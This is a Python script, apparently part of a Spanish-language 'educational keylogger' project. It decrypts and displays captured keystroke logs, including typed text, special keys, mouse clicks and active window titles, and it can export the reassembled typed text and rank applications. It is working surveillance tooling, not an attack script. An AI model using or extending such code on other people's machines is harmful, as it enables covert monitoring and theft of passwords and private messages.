#!/usr/bin/env python3
"""
Visor de Datos Capturados - Keylogger Educativo
Autor: Alvaro Manzo

MUESTRA CLARAMENTE TODO LO QUE SE CAPTURÓ
"""

import os
import json
from datetime import datetime
from pathlib import Path
from cryptography.fernet import Fernet
import argparse

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'
    BG_BLUE = '\033[44m'
    BG_GREEN = '\033[42m'

class DataViewer:
    def __init__(self):
        self.setup_paths()
        self.setup_encryption()
    
    def setup_paths(self):
        """Configurar rutas de archivos"""
        base_dir = Path(__file__).parent.parent
        self.logs_dir = base_dir / "logs"
        self.readable_file = self.logs_dir / "readable_output.txt"
        self.json_file = self.logs_dir / "captured_data.json"
        self.key_file = self.logs_dir / "encryption.key"
    
    def setup_encryption(self):
        """Configurar encriptación"""
        if self.key_file.exists():
            with open(self.key_file, 'rb') as f:
                key = f.read()
            self.cipher = Fernet(key)
        else:
            self.cipher = None
    
    def print_header(self):
        """Mostrar header del visor"""
        print(f"""
{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║                🔍 VISOR DE DATOS CAPTURADOS 🔍                ║
║               ANÁLISIS COMPLETO DE CAPTURA                    ║
╚═══════════════════════════════════════════════════════════════╝
{Colors.END}

{Colors.GREEN}📁 Archivos disponibles:{Colors.END}
├── 📄 Archivo legible: {Colors.BLUE}{self.readable_file}{Colors.END}
├── 📊 Datos JSON: {Colors.BLUE}{self.json_file}{Colors.END}
└── 🔐 Clave encriptación: {Colors.BLUE}{self.key_file}{Colors.END}
        """)
    
    def view_readable_output(self):
        """Ver archivo de salida legible"""
        if not self.readable_file.exists():
            print(f"{Colors.RED}❌ No hay archivo legible disponible{Colors.END}")
            return
        
        print(f"\n{Colors.BG_GREEN}{Colors.WHITE}{Colors.BOLD} 📖 CONTENIDO CAPTURADO (FORMATO LEGIBLE) {Colors.END}")
        print("=" * 70)
        
        try:
            with open(self.readable_file, 'r', encoding='utf-8') as f:
                content = f.read()
            
            if content.strip():
                print(f"{Colors.WHITE}{content}{Colors.END}")
            else:
                print(f"{Colors.YELLOW}El archivo está vacío{Colors.END}")
                
        except Exception as e:
            print(f"{Colors.RED}❌ Error leyendo archivo: {e}{Colors.END}")
    
    def view_json_data(self):
        """Ver datos JSON decriptados"""
        if not self.json_file.exists():
            print(f"{Colors.RED}❌ No hay datos JSON disponibles{Colors.END}")
            return
        
        if not self.cipher:
            print(f"{Colors.RED}❌ No se puede desencriptar (falta clave){Colors.END}")
            return
        
        print(f"\n{Colors.BG_BLUE}{Colors.WHITE}{Colors.BOLD} 📊 DATOS ESTRUCTURADOS (JSON) {Colors.END}")
        print("=" * 70)
        
        try:
            events = []
            with open(self.json_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line:
                        try:
                            decrypted = self.cipher.decrypt(line.encode()).decode()
                            event = json.loads(decrypted)
                            events.append(event)
                        except Exception as e:
                            continue
            
            if events:
                for i, event in enumerate(events, 1):
                    timestamp = event.get('readable_time', 'Sin fecha')
                    event_type = event.get('type', 'desconocido').upper()
                    data = event.get('data', '')
                    window = event.get('window', 'N/A')
                    
                    # Colorear según el tipo
                    if event_type == 'TEXT':
                        color = Colors.GREEN
                        icon = "📝"
                    elif event_type == 'KEY':
                        color = Colors.YELLOW
                        icon = "⌨️"
                    elif event_type == 'MOUSE':
                        color = Colors.BLUE
                        icon = "🖱️"
                    elif event_type == 'WINDOW':
                        color = Colors.PURPLE
                        icon = "🪟"
                    else:
                        color = Colors.WHITE
                        icon = "❓"
                    
                    print(f"{color}[{i:03d}] {timestamp}{Colors.END}")
                    print(f"    {icon} {color}{event_type}:{Colors.END} {Colors.WHITE}{data}{Colors.END}")
                    if window != 'N/A':
                        print(f"    🪟 Ventana: {Colors.CYAN}{window}{Colors.END}")
                    print("-" * 50)
            else:
                print(f"{Colors.YELLOW}No hay eventos para mostrar{Colors.END}")
                
        except Exception as e:
            print(f"{Colors.RED}❌ Error procesando datos JSON: {e}{Colors.END}")
    
    def analyze_data(self):
        """Analizar y mostrar estadísticas"""
        if not self.json_file.exists():
            print(f"{Colors.RED}❌ No hay datos para analizar{Colors.END}")
            return
        
        print(f"\n{Colors.CYAN}{Colors.BOLD}📈 ANÁLISIS DE DATOS CAPTURADOS{Colors.END}")
        print("=" * 50)
        
        try:
            events = []
            with open(self.json_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and self.cipher:
                        try:
                            decrypted = self.cipher.decrypt(line.encode()).decode()
                            event = json.loads(decrypted)
                            events.append(event)
                        except:
                            continue
            
            if not events:
                print(f"{Colors.YELLOW}No hay datos para analizar{Colors.END}")
                return
            
            # Estadísticas
            text_events = [e for e in events if e.get('type') == 'text']
            key_events = [e for e in events if e.get('type') == 'key']
            mouse_events = [e for e in events if e.get('type') == 'mouse']
            window_events = [e for e in events if e.get('type') == 'window']
            
            print(f"{Colors.GREEN}📊 Resumen General:{Colors.END}")
            print(f"├── Total de eventos: {Colors.WHITE}{len(events)}{Colors.END}")
            print(f"├── 📝 Texto capturado: {Colors.WHITE}{len(text_events)} líneas{Colors.END}")
            print(f"├── ⌨️  Teclas especiales: {Colors.WHITE}{len(key_events)}{Colors.END}")
            print(f"├── 🖱️  Clicks de mouse: {Colors.WHITE}{len(mouse_events)}{Colors.END}")
            print(f"└── 🪟 Cambios de ventana: {Colors.WHITE}{len(window_events)}{Colors.END}")
            
            # Texto completo capturado
            if text_events:
                print(f"\n{Colors.GREEN}📝 TEXTO COMPLETO CAPTURADO:{Colors.END}")
                print("-" * 40)
                
                all_text = ""
                for event in text_events:
                    text = event.get('data', '')
                    all_text += text + " "
                
                # Mostrar texto en bloques legibles
                words = all_text.split()
                word_count = len(words)
                char_count = len(all_text)
                
                print(f"{Colors.CYAN}Estadísticas del texto:{Colors.END}")
                print(f"├── Palabras: {Colors.WHITE}{word_count}{Colors.END}")
                print(f"└── Caracteres: {Colors.WHITE}{char_count}{Colors.END}")
                
                print(f"\n{Colors.YELLOW}Contenido:{Colors.END}")
                # Mostrar en líneas de 80 caracteres
                for i in range(0, len(all_text), 80):
                    line = all_text[i:i+80]
                    print(f"{Colors.WHITE}{line}{Colors.END}")
            
            # Aplicaciones más usadas
            if window_events:
                windows = {}
                for event in window_events:
                    window = event.get('data', 'Desconocido')
                    windows[window] = windows.get(window, 0) + 1
                
                print(f"\n{Colors.PURPLE}🪟 Aplicaciones más usadas:{Colors.END}")
                sorted_windows = sorted(windows.items(), key=lambda x: x[1], reverse=True)
                for i, (window, count) in enumerate(sorted_windows[:5], 1):
                    print(f"{i}. {Colors.CYAN}{window}{Colors.END}: {Colors.WHITE}{count} veces{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}❌ Error en análisis: {e}{Colors.END}")
    
    def export_clean_text(self):
        """Exportar solo el texto limpio"""
        output_file = self.logs_dir / "texto_limpio.txt"
        
        if not self.json_file.exists():
            print(f"{Colors.RED}❌ No hay datos para exportar{Colors.END}")
            return
        
        try:
            clean_text = []
            with open(self.json_file, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and self.cipher:
                        try:
                            decrypted = self.cipher.decrypt(line.encode()).decode()
                            event = json.loads(decrypted)
                            if event.get('type') == 'text':
                                clean_text.append(event.get('data', ''))
                        except:
                            continue
            
            if clean_text:
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write("TEXTO CAPTURADO - SOLO CONTENIDO\n")
                    f.write("=" * 40 + "\n\n")
                    for text in clean_text:
                        f.write(text + "\n")
                
                print(f"{Colors.GREEN}✅ Texto limpio exportado a: {output_file}{Colors.END}")
            else:
                print(f"{Colors.YELLOW}No hay texto para exportar{Colors.END}")
                
        except Exception as e:
            print(f"{Colors.RED}❌ Error exportando: {e}{Colors.END}")
    
    def interactive_menu(self):
        """Menú interactivo"""
        while True:
            self.print_header()
            
            print(f"\n{Colors.BOLD}🎮 Opciones de visualización:{Colors.END}")
            print(f"{Colors.GREEN}1.{Colors.END} Ver archivo legible completo")
            print(f"{Colors.BLUE}2.{Colors.END} Ver datos JSON estructurados")
            print(f"{Colors.CYAN}3.{Colors.END} Análisis y estadísticas")
            print(f"{Colors.YELLOW}4.{Colors.END} Exportar solo texto limpio")
            print(f"{Colors.PURPLE}5.{Colors.END} Ver archivos disponibles")
            print(f"{Colors.RED}6.{Colors.END} Salir")
            
            try:
                choice = input(f"\n{Colors.CYAN}Selecciona una opción (1-6):{Colors.END} ").strip()
                
                if choice == '1':
                    self.view_readable_output()
                elif choice == '2':
                    self.view_json_data()
                elif choice == '3':
                    self.analyze_data()
                elif choice == '4':
                    self.export_clean_text()
                elif choice == '5':
                    self.show_file_info()
                elif choice == '6':
                    print(f"\n{Colors.GREEN}👋 ¡Hasta luego!{Colors.END}")
                    break
                else:
                    print(f"{Colors.RED}❌ Opción inválida{Colors.END}")
                
                input(f"\n{Colors.YELLOW}Presiona Enter para continuar...{Colors.END}")
                
            except KeyboardInterrupt:
                print(f"\n\n{Colors.GREEN}👋 ¡Hasta luego!{Colors.END}")
                break
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.END}")
    
    def show_file_info(self):
        """Mostrar información de archivos"""
        print(f"\n{Colors.CYAN}📁 Información de archivos:{Colors.END}")
        
        files_to_check = [
            (self.readable_file, "Archivo legible"),
            (self.json_file, "Datos JSON"),
            (self.key_file, "Clave de encriptación")
        ]
        
        for file_path, description in files_to_check:
            if file_path.exists():
                size = file_path.stat().st_size
                modified = datetime.fromtimestamp(file_path.stat().st_mtime)
                print(f"{Colors.GREEN}✅ {description}:{Colors.END}")
                print(f"   📍 Ruta: {Colors.BLUE}{file_path}{Colors.END}")
                print(f"   📏 Tamaño: {Colors.WHITE}{size} bytes{Colors.END}")
                print(f"   🕒 Modificado: {Colors.WHITE}{modified.strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}")
            else:
                print(f"{Colors.RED}❌ {description}: No existe{Colors.END}")
            print()

def main():
    """Función principal"""
    parser = argparse.ArgumentParser(description='Visor de datos del keylogger educativo')
    parser.add_argument('--auto', action='store_true', help='Mostrar automáticamente todos los datos')
    args = parser.parse_args()
    
    viewer = DataViewer()
    
    if args.auto:
        viewer.print_header()
        print(f"{Colors.CYAN}🚀 Mostrando todos los datos automáticamente...{Colors.END}")
        viewer.view_readable_output()
        viewer.analyze_data()
    else:
        viewer.interactive_menu()

if __name__ == "__main__":
    main()
